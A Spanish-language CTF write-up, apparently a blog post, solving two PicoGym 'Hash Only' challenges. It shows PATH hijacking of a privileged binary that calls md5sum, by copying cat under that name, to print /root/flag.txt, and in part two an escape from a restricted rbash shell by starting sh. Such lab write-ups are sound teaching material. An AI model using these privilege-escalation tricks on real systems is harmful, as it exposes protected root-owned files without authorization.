---
layout: post
title: Hash Only PicoGym
comments: true
categories: [Sandbox, Writeups, PicoCTF]
---

En este post estaremos resolviendo un reto del [PicoGym](https://play.picoctf.org/practice/challenge/490?category=6&page=1&retired=0) y su segunda parte. En este caso se trata de un entorno sandbox.

<br>
![Image]({{ site.baseurl }}/images/posts/picoGym/pico_logo.png){:width="200px"}
<br>

# Hash Only 1

## Reconocimiento

   > Here is a binary that has enough privilege to read the content of the flag file but will only let you know its hash. If only it could just give you the actual content!

En este reto se nos da una conexión por *ssh* y un binario. Si probamos a ejecutarlo nos devuelve lo siguiente:

```bash
./flaghasher 
Computing the MD5 hash of /root/flag.txt.... 

2f6b98222cd483122ff3225024b10bb5  /root/flag.txt
```

Si lo descompilamos con *ghidra* veremos que la operación se hace con el siguiente comando:

```c
std::__cxx11::basic_string<>::basic_string
          ((char *)local_48,(allocator *)"/bin/bash -c \'md5sum /root/flag.txt\'");
```

## Explotación

Como se está llamando directamente al binario `md5sum`, podemos hacer que el PATH apunte a otra ruta con un binario malicioso con el mismo nombre.

```bash
cp $(which cat) md5sum
export PATH="."
```

Y al ejecutar de nuevo el binario, conseguiremos la flag:

```bash
ctf-player@pico-chall$ ./flaghasher 
Computing the MD5 hash of /root/flag.txt.... 

picoCTF{<REDACTED>}
```

# Hash Only 2

## Reconocimiento

  > Here is a binary that has enough privilege to read the content of the flag file but will only let you know its hash. If only it could just give you the actual content!

Igual que antes nos dan una conexión `ssh` y el mismo binario de antes.

## Explotación

Si intentamos el mismo proceso que antes, veremos que el PATH es *read-only* y que la shell es una `rbash` (*restricted bash*). Pero podemos tratar de cambiar la shell a una `sh`:

```bash
sh
\[\e[35m\]\u\[\e[m\]@\[\e[35m\]pico-chall\[\e[m\]$ which flaghasher
/usr/local/bin/flaghasher

cp $(which cat) md5sum
export PATH="."

\[\e[35m\]\u\[\e[m\]@\[\e[35m\]pico-chall\[\e[m\]$ /usr/local/bin/flaghasher
Computing the MD5 hash of /root/flag.txt.... 

picoCTF{<REDACTED>}
```

<br>